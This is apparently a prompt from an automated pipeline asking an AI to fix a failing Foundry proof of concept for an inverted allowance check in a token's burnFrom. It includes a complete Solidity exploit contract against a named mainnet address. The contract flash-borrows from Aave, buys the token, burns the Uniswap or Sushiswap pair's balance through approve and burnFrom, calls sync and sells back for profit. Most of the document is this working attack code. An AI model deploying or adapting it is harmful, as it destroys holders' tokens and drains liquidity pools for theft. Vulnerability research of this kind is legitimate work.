You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can burn arbitrary users' tokens via the inverted allowance check in burnFrom
- claim: `burnFrom` validates and decrements `_allowances[msg.sender][from]` instead of `_allowances[from][msg.sender]`. An attacker can therefore create the required allowance entry themselves by calling `approve(victim, amount)` from their own account, then call `burnFrom(victim, amount)` to destroy the victim's balance.
- impact: Any unprivileged attacker can permanently destroy tokens from arbitrary holders without consent, causing direct loss of funds and permissionless denial of service against users, treasuries, exchanges, liquidity pools, or other integrations that hold the token.
- exploit_paths: ["Attacker calls `approve(victim, amount)` from their own address, which sets `_allowances[attacker][victim] = amount`.", "Attacker calls `burnFrom(victim, amount)`.", "The contract accepts the attacker-controlled allowance entry, reduces it, and burns `victim`'s tokens."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITcrToken {
    function approve(address spender, uint256 amount) external;
    function burnFrom(address from, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

interface IAaveV2LendingPoolLike {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;

    address internal constant AAVE_V2_POOL = 0x7d2768dE32b0b80b7a3454c06BdAcbAcca69ddc7;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    struct Market {
        address factory;
        address pair;
        address quoteToken;
        uint112 reserveTcr;
        uint112 reserveQuote;
        bool tcrIsToken0;
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        Market memory market = _findBestMarket();
        if (market.pair == address(0) || market.reserveQuote == 0 || market.reserveTcr <= 1) {
            // Profit extraction requires a live V2-style TCR/quote pool whose reserves can be repriced via sync().
            // If no such pool exists at the fork block, the arbitrary-burn bug still exists but the monetization
            // path is mechanically unavailable without unrelated external state.
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        _profitToken = market.quoteToken;
        uint256 quoteBefore = IERC20Like(market.quoteToken).balanceOf(address(this));

        uint256 tcrBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (tcrBalance > 0) {
            _manipulateAndDump(market, tcrBalance);
            _updateProfit(quoteBefore, market.quoteToken);
            return;
        }

        uint256 quoteBalance = IERC20Like(market.quoteToken).balanceOf(address(this));
        if (quoteBalance > 0) {
            _buyBurnSell(market, quoteBalance);
            _updateProfit(quoteBefore, market.quoteToken);
            return;
        }

        uint256 loanAmount = _recommendedLoan(market);
        if (loanAmount == 0) {
            _profitAmount = 0;
            return;
        }

        address[] memory assets = new address[](1);
        assets[0] = market.quoteToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        try IAaveV2LendingPoolLike(AAVE_V2_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            abi.encode(market),
            0
        ) {
            _updateProfit(quoteBefore, market.quoteToken);
        } catch {
            // If flash liquidity for the selected quote asset is unavailable or some fork-time guard blocks execution,
            // leave profit at zero rather than pivoting to a different hypothesis.
            _profitAmount = 0;
        }
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V2_POOL, "unexpected lender");
        require(initiator == address(this), "unexpected initiator");
        require(assets.length == 1 && amounts.length == 1 && premiums.length == 1, "bad flash arrays");

        Market memory market = abi.decode(params, (Market));
        require(assets[0] == market.quoteToken, "unexpected asset");

        _buyBurnSell(market, amounts[0]);

        uint256 repayment = amounts[0] + premiums[0];
        _forceApprove(market.quoteToken, AAVE_V2_POOL, repayment);
        return true;
    }

    function _buyBurnSell(Market memory market, uint256 availableQuote) internal {
        uint256 spendAmount = _boundedSpend(market, availableQuote);
        if (spendAmount == 0) {
            return;
        }

        uint256 tcrBought = _swapExactIn(market.pair, market.quoteToken, TARGET, spendAmount);
        if (tcrBought == 0) {
            return;
        }

        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();

        uint256 tcrToSell = IERC20Like(TARGET).balanceOf(address(this));
        if (tcrToSell > 0) {
            _swapExactIn(market.pair, TARGET, market.quoteToken, tcrToSell);
        }
    }

    function _manipulateAndDump(Market memory market, uint256 tcrAmount) internal {
        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();
        _swapExactIn(market.pair, TARGET, market.quoteToken, tcrAmount);
    }

    function _burnVictimPairToDust(address pair) internal {
        uint256 victimBalance = IERC20Like(TARGET).balanceOf(pair);
        if (victimBalance <= 1) {
            return;
        }

        uint256 burnAmount = victimBalance - 1;

        // Path stage 1: attacker creates the inverted allowance entry `_allowances[attacker][victim]`.
        ITcrToken(TARGET).approve(pair, burnAmount);

        // Path stage 2: attacker burns the victim's balance using that attacker-controlled allowance slot.
        ITcrToken(TARGET).burnFrom(pair, burnAmount);
    }

    function _findBestMarket() internal view returns (Market memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < quotes.length; j++) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(TARGET, quotes[j]);
                if (pair == address(0) || pair.code.length == 0) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                address token0 = IUniswapV2PairLike(pair).token0();
                bool tcrIsToken0 = token0 == TARGET;
                uint112 reserveTcr = tcrIsToken0 ? reserve0 : reserve1;
                uint112 reserveQuote = tcrIsToken0 ? reserve1 : reserve0;
                if (reserveTcr <= 1 || reserveQuote == 0) {
                    continue;
                }

                if (reserveQuote > best.reserveQuote) {
                    best = Market({
                        factory: factories[i],
                        pair: pair,
                        quoteToken: quotes[j],
                        reserveTcr: reserveTcr,
                        reserveQuote: reserveQuote,
                        tcrIsToken0: tcrIsToken0
                    });
                }
            }
        }
    }

    function _recommendedLoan(Market memory market) internal pure returns (uint256) {
        uint256 cap;
        if (market.quoteToken == WETH) {
            cap = 1 ether;
        } else if (market.quoteToken == USDC || market.quoteToken == USDT) {
            cap = 1_000e6;
        } else if (market.quoteToken == DAI) {
            cap = 1_000e18;
        } else if (market.quoteToken == WBTC) {
            cap = 1e8;
        } else {
            return 0;
        }

        uint256 amount = uint256(market.reserveQuote) / 1_000;
        if (amount == 0) {
            amount = 1;
        }
        if (amount > cap) {
            amount = cap;
        }

        uint256 amountOut = _getAmountOut(amount, market.reserveQuote, market.reserveTcr);
        while (amountOut == 0 && amount < cap) {
            amount = amount * 2;
            if (amount > cap) {
                amount = cap;
            }
            amountOut = _getAmountOut(amount, market.reserveQuote, market.reserveTcr);
        }

        if (amountOut == 0) {
            return 0;
        }

        return amount;
    }

    function _boundedSpend(Market memory market, uint256 availableQuote) internal pure returns (uint256) {
        uint256 desired = _recommendedLoan(market);
        if (desired == 0) {
            return 0;
        }
        if (availableQuote < desired) {
            return availableQuote;
        }
        return desired;
    }

    function _swapExactIn(
        address pair,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (tokenIn == token0 && tokenOut == token1) || (tokenIn == token1 && tokenOut == token0),
            "pair mismatch"
        );

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        bool zeroForOne = tokenIn == token0;
        uint256 reserveIn = zeroForOne ? reserve0 : reserve1;
        uint256 reserveOut = zeroForOne ? reserve1 : reserve0;
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut > 0, "zero output");

        _safeTransfer(tokenIn, pair, amountIn);

        if (zeroForOne) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _updateProfit(uint256 quoteBefore, address quoteToken_) internal {
        uint256 quoteAfter = IERC20Like(quoteToken_).balanceOf(address(this));
        if (quoteAfter > quoteBefore) {
            _profitAmount = quoteAfter - quoteBefore;
        } else {
            _profitAmount = 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (ok && (ret.length == 0 || abi.decode(ret, (bool)))) {
            return;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve reset failed");

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: approve(victim, amount), _allowances[attacker][victim] = amount, burnfrom(victim, amount); generated code does not cover paths indexes: 0, 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
